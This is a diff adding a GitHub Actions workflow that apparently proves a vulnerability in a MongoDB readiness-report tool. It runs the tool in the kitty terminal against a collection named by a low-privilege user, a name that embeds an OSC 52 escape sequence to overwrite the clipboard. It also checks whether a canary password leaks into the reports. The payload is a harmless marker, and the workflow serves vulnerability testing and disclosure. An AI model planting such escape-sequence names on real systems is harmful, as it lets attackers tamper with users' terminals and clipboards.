@@ -1,0 +1,187 @@
+name: Agent 8 TRR kitty clipboard proof
+
+on:
+  push:
+    branches:
+      - agent8-mongosql-trr-20260830
+
+permissions:
+  contents: read
+
+jobs:
+  kitty-clipboard-proof:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install clean kitty and X11 clipboard tooling
+        shell: bash
+        run: |
+          set -euxo pipefail
+          sudo apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq kitty x11-utils xclip xvfb
+          kitty --version | tee kitty-version.txt
+          (kitty +kitten show_config 2>&1 || true) | tee kitty-show-config.txt
+
+      - name: Download official TRR 1.1.3
+        shell: bash
+        run: |
+          set -euxo pipefail
+          mkdir -p evidence/bin evidence/run
+          mv kitty-version.txt kitty-show-config.txt evidence/run/
+          curl --fail --location --retry 5 --retry-all-errors \
+            https://translators-connectors-releases.s3.amazonaws.com/transition-readiness-report/AtlasSQLReadinessReport-linux \
+            -o evidence/bin/AtlasSQLReadinessReport-linux
+          chmod +x evidence/bin/AtlasSQLReadinessReport-linux
+          evidence/bin/AtlasSQLReadinessReport-linux --version | tee evidence/bin/version.txt
+          sha256sum evidence/bin/AtlasSQLReadinessReport-linux | tee evidence/bin/sha256.txt
+
+      - name: Create a low-privilege attacker and malicious collection
+        shell: bash
+        run: |
+          set -euxo pipefail
+          docker run -d --name mongo \
+            -p 127.0.0.1:27017:27017 \
+            -e MONGO_INITDB_ROOT_USERNAME=operator \
+            -e MONGO_INITDB_ROOT_PASSWORD=OPERATOR_SECRET_CANARY_91B7 \
+            mongo:8.0 --bind_ip_all
+
+          ready=0
+          for i in $(seq 1 90); do
+            if docker exec mongo mongosh --quiet -u operator -p OPERATOR_SECRET_CANARY_91B7 \
+              --authenticationDatabase admin --eval 'db.adminCommand({ping:1})' >/dev/null 2>&1; then
+              ready=1; break
+            fi
+            sleep 2
+          done
+          test "$ready" = 1
+
+          docker exec mongo mongosh --quiet -u operator -p OPERATOR_SECRET_CANARY_91B7 \
+            --authenticationDatabase admin --eval '
+              db.getSiblingDB("trrtermclip").createUser({
+                user: "attacker",
+                pwd: "ATTACKER_PASSWORD_NOT_SECRET",
+                roles: [{ role: "readWrite", db: "trrtermclip" }]
+              });
+            ' | tee evidence/run/create-attacker.log
+
+          cat > evidence/run/attacker-seed.js <<'JS'
+          const d = db.getSiblingDB("trrtermclip");
+          const payload = "\u001b]52;c;VFJSX0NMSVBfT0s=\u0007";
+          d.createCollection("normal_collection");
+          d.normal_collection.insertOne({ value: 1 });
+          d.createCollection(payload);
+          d.getCollection(payload).insertOne({ value: 1 });
+          printjson({
+            authenticatedUser: db.runCommand({ connectionStatus: 1 }).authInfo.authenticatedUsers,
+            collections: d.getCollectionNames()
+          });
+          JS
+
+          docker exec -i mongo mongosh --quiet \
+            -u attacker -p ATTACKER_PASSWORD_NOT_SECRET \
+            --authenticationDatabase trrtermclip \
+            < evidence/run/attacker-seed.js 2>&1 | tee evidence/run/attacker-seed.log
+
+      - name: Execute default and quiet TRR runs in clean kitty
+        shell: bash
+        run: |
+          set -euxo pipefail
+          export DISPLAY=:99
+          export KITTY_DISABLE_WAYLAND=1
+          Xvfb :99 -screen 0 1280x800x24 > evidence/run/xvfb.log 2>&1 &
+          XVFB_PID=$!
+          sleep 2
+
+          export BIN="$GITHUB_WORKSPACE/evidence/bin/AtlasSQLReadinessReport-linux"
+          export URI='mongodb://operator:OPERATOR_SECRET_CANARY_91B7@127.0.0.1:27017/admin?authSource=admin&directConnection=true&readPreference=primary&serverSelectionTimeoutMS=5000&connectTimeoutMS=5000'
+
+          run_case() {
+            local name="$1"
+            local extra="$2"
+            local initial="$3"
+            local out="$GITHUB_WORKSPACE/evidence/run/$name"
+            local done="/tmp/${name}.done"
+            mkdir -p "$out/report"
+            rm -f "$done"
+
+            printf '%s' "$initial" | xclip -selection clipboard
+            sleep 0.3
+            echo "before=$(xclip -o -selection clipboard 2>/dev/null || true)" > "$out/clipboard.txt"
+
+            cat > "$out/runner.sh" <<SH
+          #!/usr/bin/env bash
+          set +e
+          script -q -e -c "'$BIN' --uri '$URI' --output '$out/report' --include 'trrtermclip.*' $extra" '$out/typescript.bin'
+          echo \$? > '$out/tool.status'
+          touch '$done'
+          sleep 8
+          SH
+            chmod +x "$out/runner.sh"
+
+            kitty --config NONE --class "agent8-$name" --title "AGENT8_$name" "$out/runner.sh" \
+              > "$out/kitty.stdout" 2> "$out/kitty.stderr" &
+            local kpid=$!
+            echo "$kpid" > "$out/kitty.pid"
+
+            for i in $(seq 1 300); do
+              if [ -e "$done" ]; then
+                sleep 1
+                break
+              fi
+              sleep 0.1
+            done
+
+            echo "after=$(xclip -o -selection clipboard 2>/dev/null || true)" >> "$out/clipboard.txt"
+            xwininfo -root -tree > "$out/xwininfo.txt" 2>&1 || true
+            kill "$kpid" >/dev/null 2>&1 || true
+            wait "$kpid" >/dev/null 2>&1 || true
+          }
+
+          run_case default '' 'TRR_CLIP_INITIAL_DEFAULT'
+          run_case quiet '--quiet' 'TRR_CLIP_INITIAL_QUIET'
+
+          kill "$XVFB_PID" >/dev/null 2>&1 || true
+          wait "$XVFB_PID" >/dev/null 2>&1 || true
+
+      - name: Derive verdict and package proof
+        if: always()
+        shell: bash
+        run: |
+          set +e
+          grep -aob 'TRR_CLIP_OK' evidence/run/default/typescript.bin \
+            > evidence/run/default/raw-marker-offsets.txt || true
+          grep -aob 'TRR_CLIP_OK' evidence/run/quiet/typescript.bin \
+            > evidence/run/quiet/raw-marker-offsets.txt || true
+          grep -RIna --binary-files=without-match 'OPERATOR_SECRET_CANARY_91B7' \
+            evidence/run/default/report evidence/run/quiet/report \
+            > evidence/run/generated-report-secret-check.txt || true
+
+          python3 - <<'PY'
+          from pathlib import Path
+          default = Path('evidence/run/default/clipboard.txt').read_text(errors='replace')
+          quiet = Path('evidence/run/quiet/clipboard.txt').read_text(errors='replace')
+          Path('evidence/run/verdict.txt').write_text(
+              'DEFAULT=' + repr(default) + '\n' +
+              'QUIET=' + repr(quiet) + '\n' +
+              'DEFAULT_CLIPBOARD_CHANGED=' + str('after=TRR_CLIP_OK' in default) + '\n' +
+              'QUIET_CLIPBOARD_RETAINED=' + str('after=TRR_CLIP_INITIAL_QUIET' in quiet) + '\n',
+              encoding='utf-8'
+          )
+          PY
+
+          docker logs mongo > evidence/run/mongodb.stdout.txt 2> evidence/run/mongodb.stderr.txt
+          tar --sort=name --mtime='UTC 2026-08-30' -czf agent8-trr-kitty-clipboard-proof.tar.gz evidence
+          sha256sum agent8-trr-kitty-clipboard-proof.tar.gz > agent8-trr-kitty-clipboard-proof.tar.gz.sha256
+
+      - name: Upload kitty clipboard proof
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: agent8-trr-kitty-clipboard-proof
+          path: |
+            agent8-trr-kitty-clipboard-proof.tar.gz
+            agent8-trr-kitty-clipboard-proof.tar.gz.sha256
+          retention-days: 7
+          if-no-files-found: error
